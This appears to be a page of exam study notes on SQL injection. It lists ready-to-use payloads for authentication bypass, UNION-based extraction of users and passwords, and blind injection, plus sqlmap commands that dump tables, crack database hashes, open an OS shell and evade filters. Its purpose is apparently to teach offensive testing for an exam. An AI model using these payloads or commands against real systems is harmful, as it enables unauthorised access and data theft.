# 6. SQL Injection

## Core idea
Unsanitized user input becomes part of a SQL query. Goal: bypass auth, extract data (`UNION`), read files, sometimes RCE.

## Manual injection payloads (classic workflow)
```sql
'                          # break the query → SQL error = vulnerable
' OR 1=1 --                # auth bypass (comment kills rest of query)
' OR 1=1 #                 # MySQL comment variant
' OR '1'='1                # without comment
admin' --                 # log in as first user
' UNION SELECT NULL--      # test column count, keep adding NULL until no error
' UNION SELECT NULL,NULL--
' UNION SELECT 1,2,3--     # find which columns display

# Fingerprint DB / extract (MySQL examples)
' UNION SELECT version(),user(),database()--
' UNION SELECT table_name,NULL FROM information_schema.tables--
' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--
' UNION SELECT username,password FROM users--
```

**Blind SQLi** (no visible output): use `AND SLEEP(5)--` (time-based) or boolean `AND 1=1` vs `AND 1=2` differences.

## sqlmap (the automated hammer)
```bash
# Basic
sqlmap -u "http://target.com/page?id=1" --batch

# POST form (capture request with Burp, save to file)
sqlmap -r request.txt --batch

# Specify the param & method
sqlmap -u "http://target.com/login.php" --data="user=a&pass=b" --batch

# Enumerate databases/tables/columns/dump
sqlmap -u URL --dbs              # list databases
sqlmap -u URL -D mydb --tables   # tables in db
sqlmap -u URL -D mydb -T users --columns
sqlmap -u URL -D mydb -T users --dump     # dump the table
sqlmap -u URL --os-shell          # try interactive OS shell (MySQL FILE privilege)
sqlmap -u URL --passwords         # crack DB user hashes with sqlmap's built-in
sqlmap -u URL -p id --level=3 --risk=2     # more thorough (p = test this param)
sqlmap -u URL --forms              # auto-parse forms on page
sqlmap -u URL --cookie="PHPSESSID=abc123"   # with session
sqlmap -u URL --tamper=space2comment   # evade filters
```

## Browser tools
- **Burp Suite / OWASP ZAP** — intercept requests, Repeater for manual payload testing.
- Save the intercepted request to a file for `sqlmap -r`.
- **sqlmap** against a login page: `--data="username=a&password=b"`.

## Common defense you may be asked about
Parameterized queries / prepared statements, input validation, least-privilege DB users, WAFs, error suppression.

## Exam workflow
1. Find input points (login forms, `?id=` URLs).
2. Test with `'` → error? → try `' OR 1=1 --`.
3. If manual is slow → capture request → `sqlmap -r`.
4. Escalate: `--dbs` → `-D -T` → `--dump`.
5. Report what DB/version/table you extracted (they usually ask for a specific flag in the data).

← [Back to index](README.md)
